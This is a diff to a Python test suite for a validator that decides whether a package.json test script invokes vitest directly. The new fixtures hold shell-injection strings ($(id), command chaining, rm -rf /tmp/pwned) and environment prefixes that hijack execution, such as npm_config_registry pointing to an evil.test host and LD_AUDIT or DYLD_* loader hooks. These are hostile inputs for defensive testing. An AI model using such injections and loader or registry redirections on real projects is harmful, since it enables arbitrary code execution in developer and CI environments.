@@ -17,24 +17,26 @@ SHADOWING_MARKER = "SHADOWING_PAYLOAD_4C7A"
 SHADOWING_BODY = f"echo {SHADOWING_MARKER}"
 
 # Every body demonstrated in the first security review: the environment prefix used
-# to smuggle a substitution, a chain, a redirection, a quote or an expansion.
+# to smuggle a substitution, a chain, a redirection, a quote or an expansion. The keys
+# are all recognized ones on purpose, so each case still isolates the value class
+# rather than being rejected earlier for its key.
 CROSS_ENV_INJECTIONS = [
-    "cross-env FOO=$(id) vitest run",
-    "cross-env FOO=1;touch /tmp/pwned vitest run",
-    "cross-env A=`id` vitest",
-    "cross-env A=x&&touch /tmp/pwned vitest",
-    "cross-env A=x|touch /tmp/pwned vitest",
-    "cross-env A=x>/tmp/pwned vitest",
-    "cross-env A=x</tmp/pwned vitest",
-    "cross-env A='x;id' vitest",
-    'cross-env A="$(id)" vitest',
-    "cross-env A=$IFS vitest",
-    "cross-env A=x{a,b} vitest",
-    "cross-env A=* vitest",
-    "cross-env A=~/x vitest",
-    "cross-env A=x\\;id vitest",
-    "FOO=$(id) vitest run",
-    "FOO=`id` vitest run",
+    "cross-env NODE_ENV=$(id) vitest run",
+    "cross-env NODE_ENV=1;touch /tmp/pwned vitest run",
+    "cross-env CI=`id` vitest",
+    "cross-env CI=x&&touch /tmp/pwned vitest",
+    "cross-env CI=x|touch /tmp/pwned vitest",
+    "cross-env CI=x>/tmp/pwned vitest",
+    "cross-env CI=x</tmp/pwned vitest",
+    "cross-env CI='x;id' vitest",
+    'cross-env CI="$(id)" vitest',
+    "cross-env CI=$IFS vitest",
+    "cross-env DEBUG=x{a,b} vitest",
+    "cross-env DEBUG=* vitest",
+    "cross-env TZ=~/x vitest",
+    "cross-env TZ=x\\;id vitest",
+    "VITE_API_URL=$(id) vitest run",
+    "VITEST_MODE=`id` vitest run",
     "NODE_OPTIONS=--require=$(id) vitest",
 ]
 
@@ -45,7 +47,7 @@ NEWLINE_CHAINING = [
     "vitest\n\ntouch /tmp/pwned",
     "vitest run\nrm -rf /tmp/pwned",
     "vitest\rtouch /tmp/pwned",
-    "cross-env A=1\nid vitest",
+    "cross-env CI=1\nid vitest",
     "npx\nid vitest",
 ]
 
@@ -88,6 +90,44 @@ EXECUTION_REDIRECTING_ENV_KEYS = [
     "DYLD_LIBRARY_PATH=/tmp/evillib vitest run",
 ]
 
+# npm and bun read every config option from the environment as well as from flags, so a
+# config key in front of a launcher redirects what the launcher fetches and executes:
+# --package by another spelling, a repository-controlled .npmrc, or a registry the
+# attacker serves. The uppercase spellings are equally valid, which is why the key rule
+# is an allowlist rather than a list of names to reject.
+PACKAGE_MANAGER_CONFIG_ENV_KEYS = [
+    "npm_config_package=file:./evil npx vitest run",
+    "NPM_CONFIG_PACKAGE=file:./evil npx vitest run",
+    "npm_config_userconfig=./evil.npmrc npx vitest run",
+    "npm_config_registry=http://evil.test npx vitest run",
+    "BUN_CONFIG_REGISTRY=http://evil.test bunx vitest run",
+    "cross-env npm_config_package=file:./evil npx vitest run",
+    "NODE_ENV=test npm_config_package=file:./evil npx vitest run",
+]
+
+# The same family as LD_PRELOAD: the dynamic loader loads and runs these objects, or
+# resolves libraries and frameworks from these directories, before the program starts.
+LOADER_HOOK_ENV_KEYS = [
+    "LD_AUDIT=./evil.so vitest run",
+    "LD_PROFILE=./evil.so vitest run",
+    "DYLD_FALLBACK_LIBRARY_PATH=/tmp/evil vitest run",
+    "DYLD_FRAMEWORK_PATH=/tmp/evil vitest run",
+    "DYLD_FALLBACK_FRAMEWORK_PATH=/tmp/evil vitest run",
+    "DYLD_VERSIONED_LIBRARY_PATH=/tmp/evil vitest run",
+]
+
+# A key the runner does not recognize is rejected on the key alone, whatever its value
+# and whatever case it is written in. This pins the restrictive side of the allowlist.
+UNRECOGNIZED_ENV_KEYS = [
+    "FOO=1 vitest run",
+    "MY_APP_TOKEN=abc vitest run",
+    "cross-env FOO=1 vitest run",
+    "ci=true vitest run",
+    "Node_Env=test vitest run",
+    "vite_api_url=http://localhost vitest run",
+    "NODE_ENV=test FOO=1 vitest run",
+]
+
 SHELL_CHAINING = [
     "npm run lint && vitest run",
     "vitest; rm -rf /tmp/pwned",
@@ -116,6 +156,15 @@ ENV_PREFIXED_DIRECT_BODIES = [
     "NODE_OPTIONS=--max-old-space-size=4096 vitest run",
     "TZ=UTC vitest run",
     "TZ=America/New_York NODE_ENV=test vitest run",
+    "CI=true vitest run",
+    "cross-env CI=true vitest run",
+    "VITE_API_URL=http://localhost:3000 vitest run",
+    "VITE_API_URL=http://localhost:3000 CI=true npx vitest run",
+    "VITEST_MAX_THREADS=2 vitest run",
+    "VITEST=1 vitest run",
+    "DEBUG=vite:config vitest run",
+    "FORCE_COLOR=1 vitest run",
+    "NO_COLOR=1 vitest run",
 ]
 
 LAUNCHER_DIRECT_BODIES = [
@@ -169,6 +218,18 @@ class DirectScriptPredicateTests(unittest.TestCase):
         """Mutation target: accepting any shell-identifier key, so PATH can replace the binary."""
         self.assert_indirect(EXECUTION_REDIRECTING_ENV_KEYS)
 
+    def test_package_manager_config_environment_keys_are_indirect(self):
+        """Mutation target: a key rule that admits npm_config_*/BUN_CONFIG_*, redirecting what npx fetches."""
+        self.assert_indirect(PACKAGE_MANAGER_CONFIG_ENV_KEYS)
+
+    def test_loader_hook_environment_keys_are_indirect(self):
+        """Mutation target: a key rule that admits LD_AUDIT/LD_PROFILE/DYLD_* loader hooks."""
+        self.assert_indirect(LOADER_HOOK_ENV_KEYS)
+
+    def test_unrecognized_environment_keys_are_indirect(self):
+        """Mutation target: turning the key allowlist back into a denylist, so unknown keys pass."""
+        self.assert_indirect(UNRECOGNIZED_ENV_KEYS)
+
     def test_shell_chaining_and_redirection_are_indirect(self):
         """Mutation target: an argument class that admits a command separator."""
         self.assert_indirect(SHELL_CHAINING)
@@ -184,6 +245,16 @@ class DirectScriptPredicateTests(unittest.TestCase):
     def test_environment_prefixed_invocations_stay_direct(self):
         """Mutation target: rejecting the KEY=value prefix, which silently drops the project env."""
         self.assert_direct(ENV_PREFIXED_DIRECT_BODIES)
+
+    def test_recognized_environment_keys_behave_the_same_with_cross_env(self):
+        """Mutation target: a key rule applied to only one of the two prefix spellings."""
+        for body in ENV_PREFIXED_DIRECT_BODIES + UNRECOGNIZED_ENV_KEYS + PACKAGE_MANAGER_CONFIG_ENV_KEYS:
+            bare = body[len("cross-env ") :] if body.startswith("cross-env ") else body
+            with self.subTest(body=bare):
+                self.assertEqual(
+                    run_vitest.is_direct_vitest_script(bare),
+                    run_vitest.is_direct_vitest_script(f"cross-env {bare}"),
+                )
 
     def test_binary_resolving_launchers_stay_direct(self):
         """Mutation target: dropping a launcher that always resolves to the installed binary."""
